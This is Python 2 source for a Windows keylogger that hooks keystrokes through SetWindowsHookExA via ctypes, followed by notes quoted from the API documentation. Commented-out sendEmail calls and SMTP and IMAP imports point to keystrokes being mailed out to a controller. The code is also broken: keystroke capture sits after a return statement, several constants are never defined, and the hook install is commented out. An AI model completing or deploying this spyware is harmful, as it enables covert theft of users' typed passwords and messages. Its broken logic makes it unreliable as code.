import subprocess
import sys
import os
import base64
import binascii
import threading
import time
import random
import string
import imaplib
import email
import uuid
import platform
import ctypes
import json
#import logging

#from traceback import print_exc, format_exc
from base64 import b64decode
from smtplib import SMTP
from email.MIMEMultipart import MIMEMultipart
from email.MIMEBase import MIMEBase
from email.MIMEText import MIMEText
from email import Encoders
from struct import pack
from zlib import compress, crc32
from ctypes import c_void_p, c_int, create_string_buffer, sizeof, windll, Structure, POINTER, WINFUNCTYPE, CFUNCTYPE, POINTER
from ctypes.wintypes import BOOL, DOUBLE, DWORD, HBITMAP, HDC, HGDIOBJ, HWND, INT, LPARAM, LONG, RECT, UINT, WORD, MSG

class keylogger(threading.Thread):
    #Stolen from http://earnestwish.com/2015/06/09/python-keyboard-hooking/                                                          
    exit = False

    def __init__(self):
        threading.Thread.__init__(self)
        self.daemon = True #protect zomebie threads
        self.hooked = None
        self.keys = ''
        self.start()
        print("\n 2 in __init__")

    def installHookProc(self, pointer):
        print("\n  install hookProc")                                           
        self.hooked = ctypes.windll.user32.SetWindowsHookExA( 
                        WH_KEYBOARD_LL,
                        pointer,
                        windll.kernel32.GetModuleHandleW(None),
                        0
        )

        if not self.hooked:
            return False
        return True

    def uninstallHookProc(self):  
        print("\n uninstallHookProc")                                                
        if self.hooked is None:
            return
        ctypes.windll.user32.UnhookWindowsHookEx(self.hooked)
        self.hooked = None

    def getFPTR(self,fn):
        print("\n getFPTR receive fn>",fn)                                                                  
        CMPFUNC = CFUNCTYPE(c_int, c_int, c_int, POINTER(c_void_p))
        print("CMPF",CMPFUNC)
        print("CMPF(fn)",CMPFUNC(fn))
        return CMPFUNC(fn)
    
    #test prehook function
    def prehookProc(self):
        print("in prehook")
        return("return prehookProc")

    def hookProc(self, nCode, wParam, lParam):
        print("\n in hookProc")

        if wParam is not WM_KEYDOWN:
            #ignore it self
            print("not WM_KEYDOWN")
            return ctypes.windll.user32.CallNextHookEx(self.hooked, nCode, wParam, lParam)
            self.keys += chr(lParam[0])

        if len(self.keys) > 10:
            #sendEmail({'cmd': 'keylogger', 'res': r'{}'.format(self.keys)}, self.jobid)
            print("key > 10")
            print("keylog : ",keys)
            self.keys = ''

        if (CTRL_CODE == int(lParam[0])) or (self.exit == True):
            #sendEmail({'cmd': 'keylogger', 'res': 'Keylogger stopped'}, self.jobid)
            print("keylogger is stopped")
            self.uninstallHookProc()
         
        return ctypes.windll.user32.CallNextHookEx(self.hooked, nCode, wParam, lParam)     

    def startKeyLog(self):
         print("\n instartKeyLog")                                                                
         msg = MSG()
         ctypes.windll.user32.GetMessageA(ctypes.byref(msg),0,0,0)

    def run(self):
        print("\n 3 in run function")                        
        pointer = self.getFPTR(self.hookProc)
        print("\n pointer>",pointer)

        #if self.installHookProc(pointer):
            #print("keylogger is running")
            #sendEmail({'cmd': 'keylogger', 'res': 'Keylogger started'}, self.jobid)
            #self.startKeyLog()


if __name__=="__main__":
    try:
        print("1 in try..")
        keylogger.exit = False
        keylogger()
        print("back in main")

    except KeyboardInterrupt:
        print("in KeyboardInterrupt")
        keylogger.exit = True


'''
        HHOOK WINAPI SetWindowsHookEx(
            process (check function hook > pointer > set headhook > set target thread)
            _In_ int       idHook (ex WH_KEYBOARD_LL)(function of hook),

            _In_ HOOKPROC  lpfn (pointer only)--->,

            _In_ HINSTANCE hMod A handle to the DLL containing the hook procedure pointed to by the lpfn parameter.
            (number of hook procedure or HOOKPROC (handler)) ex.windll.kernel32.GetModuleHandleW(None or Path of program) 
            None it's' mean itself (If this parameter is NULL or NONE, GetModuleHandle returns a handle to 
            the file used to create the calling process 
            (.exe file).),

            _In_ DWORD     dwThreadId The identifier of the thread with which the hook procedure is to be associated
            (0  if this parameter is zero, the hook procedure is associated with all existing threads running in the same desktop 
            as the calling thread),
        );
        SetWindowsHookExA : https://msdn.microsoft.com/en-us/library/windows/desktop/ms644990(v=vs.85).aspx
        GetModuleHandleW (W = unicode type): https://msdn.microsoft.com/en-us/library/windows/desktop/ms683199(v=vs.85).aspx

        CallNextHookEx
         Passes the hook information to the next hook procedure in the current hook chain. 
            A hook procedure can call this function either before or after processing the hook information.

            hhk [in, optional]
            Type: HHOOK
            This parameter is ignored.

            nCode [in]
            Type: int
            The hook code passed to the current hook procedure. 
            The next hook procedure uses this code to determine how to process the hook information.

            wParam [in]
            Type: WPARAM
            The wParam value passed to the current hook procedure. 
            The meaning of this parameter depends on the type of hook associated with the current hook chain.

            lParam [in] *import form ctype.wintype
            Type: LPARAM
            The lParam value passed to the current hook procedure. 
            The meaning of this parameter depends on the type of hook associated with the current hook chain.
        
        
        EX.CFUNCTYPE(int,int,int,void *)

        ctypes.CFUNCTYPE(restype, *argtypes, use_errno=False, use_last_error=False)
        The returned function prototype creates functions that use the standard C calling convention. 
        The function will release the GIL during the call. If use_errno is set to true, 
        the ctypes private copy of the system errno variable is exchanged with the real errno value 
        before and after the call;use_last_error does the same for the Windows error code.
'''